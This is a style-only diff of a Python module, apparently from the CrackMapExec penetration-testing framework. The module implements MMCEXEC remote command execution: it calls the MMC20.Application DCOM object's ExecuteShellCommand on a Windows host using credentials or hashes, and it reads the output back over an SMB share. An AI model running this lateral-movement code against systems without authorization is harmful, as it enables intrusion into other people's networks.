@@ -60,9 +60,7 @@ from impacket.dcerpc.v5.dtypes import NULL
 
 
 class MMCEXEC:
-    def __init__(
-        self, host, share_name, username, password, domain, smbconnection, hashes=None
-    ):
+    def __init__(self, host, share_name, username, password, domain, smbconnection, hashes=None):
         self.__host = host
         self.__username = username
         self.__password = password
@@ -92,9 +90,7 @@ class MMCEXEC:
             oxidResolver=True,
         )
         try:
-            iInterface = dcom.CoCreateInstanceEx(
-                string_to_bin("49B2791A-B1AE-4C90-9B8E-E860BA07F889"), IID_IDispatch
-            )
+            iInterface = dcom.CoCreateInstanceEx(string_to_bin("49B2791A-B1AE-4C90-9B8E-E860BA07F889"), IID_IDispatch)
             iMMC = IDispatch(iInterface)
 
             resp = iMMC.GetIDsOfNames(("Document",))
@@ -104,28 +100,14 @@ class MMCEXEC:
             dispParams["rgdispidNamedArgs"] = NULL
             dispParams["cArgs"] = 0
             dispParams["cNamedArgs"] = 0
-            resp = iMMC.Invoke(
-                resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], []
-            )
+            resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
-            iDocument = IDispatch(
-                self.getInterface(
-                    iMMC, resp["pVarResult"]["_varUnion"]["pdispVal"]["abData"]
-                )
-            )
+            iDocument = IDispatch(self.getInterface(iMMC, resp["pVarResult"]["_varUnion"]["pdispVal"]["abData"]))
             resp = iDocument.GetIDsOfNames(("ActiveView",))
-            resp = iDocument.Invoke(
-                resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], []
-            )
+            resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
-            iActiveView = IDispatch(
-                self.getInterface(
-                    iMMC, resp["pVarResult"]["_varUnion"]["pdispVal"]["abData"]
-                )
-            )
-            pExecuteShellCommand = iActiveView.GetIDsOfNames(("ExecuteShellCommand",))[
-                0
-            ]
+            iActiveView = IDispatch(self.getInterface(iMMC, resp["pVarResult"]["_varUnion"]["pdispVal"]["abData"]))
+            pExecuteShellCommand = iActiveView.GetIDsOfNames(("ExecuteShellCommand",))[0]
 
             pQuit = iMMC.GetIDsOfNames(("Quit",))[0]
 
@@ -177,9 +159,7 @@ class MMCEXEC:
         dispParams["cArgs"] = 0
         dispParams["cNamedArgs"] = 0
 
-        self.__quit[0].Invoke(
-            self.__quit[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], []
-        )
+        self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
         return True
 
     def execute_remote(self, data):
@@ -188,11 +168,7 @@ class MMCEXEC:
 
         command = "/Q /c " + data
         if self.__retOutput is True:
-            command += (
-                " 1> "
-                + f"\\\\{local_ip}\\{self.__share_name}\\{self.__output}"
-                + " 2>&1"
-            )
+            command += " 1> " + f"\\\\{local_ip}\\{self.__share_name}\\{self.__output}" + " 2>&1"
 
         dispParams = DISPPARAMS(None, False)
         dispParams["rgdispidNamedArgs"] = NULL
@@ -226,9 +202,7 @@ class MMCEXEC:
         dispParams["rgvarg"].append(arg1)
         dispParams["rgvarg"].append(arg0)
 
-        self.__executeShellCommand[0].Invoke(
-            self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], []
-        )
+        self.__executeShellCommand[0].Invoke(self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
         self.get_output_fileless()
 
     def output_callback(self, data):
@@ -240,9 +214,7 @@ class MMCEXEC:
 
         while True:
             try:
-                with open(
-                    path_join("/tmp", "cme_hosted", self.__output), "r"
-                ) as output:
+                with open(path_join("/tmp", "cme_hosted", self.__output), "r") as output:
                     self.output_callback(output.read())
                 break
             except IOError:
